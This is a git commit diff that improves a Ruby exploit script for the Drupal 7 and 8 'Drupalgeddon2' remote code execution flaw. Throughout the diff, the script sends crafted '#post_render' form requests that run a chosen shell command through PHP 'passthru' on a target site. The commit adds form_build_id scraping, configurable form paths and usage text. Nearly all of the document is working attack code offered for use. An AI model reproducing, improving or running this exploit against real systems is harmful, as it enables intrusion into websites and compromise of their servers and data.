12e666b63ff829202d6facffc269ceeba3c366c4
Gonzalo Garcia <gonzalo.g@opendatasecurity.io>
2018-04-20 12:09:23 +0100

    Drupal 8 exploit bug fixes

--- drupalgeddon2.1.rb
+++ drupalgeddon2.1.rb
@@ -6,6 +6,7 @@ require 'base64'
 require 'json'
 require 'net/http'
 require 'openssl'
+require 'nokogiri'
 
 class Target
 
@@ -13,14 +14,17 @@ class Target
 	# PHP method to use, by default passtrhu	
 	# command = Command to execute
 
-	def initialize(host,command,php_method='passthru')
+	def initialize(host,command,php_method='passthru',form_path=0)
 		@host = host
 		@method = php_method
 		@command = command
 		@uri = URI(host)
 
+		@form_path = form_path
+
 		@http = create_http
 	end
+
 
 	def success
 		puts "[+] Target seems to be exploitable! w00hooOO!"
@@ -53,61 +57,97 @@ class Target
 end
 
 class Drupal8 < Target
-	def initialize(host,command,php_method='passthru')
-		super(host,command,php_method)
+	def initialize(host,command,php_method='passthru',form_path=0)
+		super(host,command,php_method,form_path)
 	end
 
 	# Not finished yet
 	def exploit
 
 		# Make the request
-		req = Net::HTTP::Post.new(URI.encode("/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax"))
+		req = Net::HTTP::Post.new(URI.encode("#{@uri.path}user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax"))
 		req.body = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + @method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command
 
-		response = http.request(req)
+		response = @http.request(req)
 		check_response(response)
-		puts response.body
+		puts response.body.split('[{"command"')[0]
 
 	end
 end
 
 class Drupal7 < Target
-	def initialize(host,command,php_method='passthru')
-		super(host,command,php_method)
+	def initialize(host,command,php_method='passthru',form_path=0)
+		super(host,command,php_method,form_path)
+	end
+
+	def get_form_build_id(response)
+		page = Nokogiri::HTML(response)
+		form = page.css('form#user-pass')
+		return /<input type="hidden" name="form_build_id" value="([^"]+)"/.match(form.to_s)[1]
 	end
 
 	def exploit
+
+		payload = URI.encode("name[#post_render][]=#{@method}&name[#markup]=#{@command}&name[#type]=markup")
+
+		if @form_path == 0 then
+			form = '/?q=user/password&'
+			form2 = '?q=file'
+		else
+			form = '/user/password/?'
+			form2 = 'file'
+		end
+
+		payload = @uri.path + form + payload
 		
-		req = Net::HTTP::Post.new(URI.encode("/?q=user/password&name[#post_render][]=#{@method}&name[#markup]=#{@command}&name[#type]=markup"))
+		puts "Requesting: " + @uri.host + payload
+		puts "POST: " + 'form_id=user_pass&_triggering_element_name=name'
+
+		#
+  		# => First request, trying to obtain form_build_id
+  		#
+		req = Net::HTTP::Post.new(payload)
 		req.body = 'form_id=user_pass&_triggering_element_name=name'
 
 		response = @http.request(req)
+		puts response.code
+		
+		form_build_id = get_form_build_id(response.body)
+  		
+	  	puts "[*] Obtained build id!: #{form_build_id}"
 
-  		form_build_id = /<input type="hidden" name="form_build_id" value="([^"]+)" \/>/.match(response.body)[1]
   		post_parameters = "form_build_id=#{form_build_id}"
 
-		req = Net::HTTP::Post.new(URI.encode("/?q=file/ajax/name/#value/#{form_build_id}"))
+  		#
+  		# => Second Request
+  		#
+		req = Net::HTTP::Post.new(URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}"))
+		puts "Requesting: " + @uri.host + URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}")
+		puts "POST: " + post_parameters
 		req.body = post_parameters
 
 		response = @http.request(req)
 
+		puts "Response code: " + response.code
+		
 		if response.body.split('[{"command"')[0] == ""
 			if(@command != 'id')
 				failed("Maybe incorrect input command, try simple command as 'id'")
 			end
 				failed("")
 		end
-
-		success
+		
 		puts response.body.split('[{"command"')[0]
 	end
 end
 
 
 # Quick how to use
-if ARGV.empty? || ARGV.length < 2
-  puts "Usage: ruby drupalggedon2.rb <target> <version [7,8]> <command>"
-  puts "       ruby drupalgeddon2.rb 7 https://example.com whoami"
+if ARGV.empty? || ARGV.length < 2 || ARGV[0] == "-h" || ARGV[0] == "--help"
+  puts "Usage: ruby drupalggedon2.rb <target> <version [7,8]> <command> [php_method] [form_path]"
+  puts "       ruby drupalgeddon2.rb 7 https://example.com whoami passtrhu [0,1]"
+  puts "form_path: 0 => Vulnerable form on /?q=user/password"
+  puts "form_path: 1 => Vulnerable form on /user/password"
   exit
 end
 
@@ -115,11 +155,13 @@ end
 target = ARGV[0]
 version = ARGV[1]
 command = ARGV[2]
+php_method = ARGV[3] || 'passthru'
+form_path = ARGV[4] || 0
 
 if version == "7"
-	drupal = Drupal7.new(target,command)
+	drupal = Drupal7.new(target,command,php_method,form_path)
 else
-	drupal = Drupal8.new(target,command)
+	drupal = Drupal8.new(target,command,php_method,form_path)
 end
 
 drupal.exploit
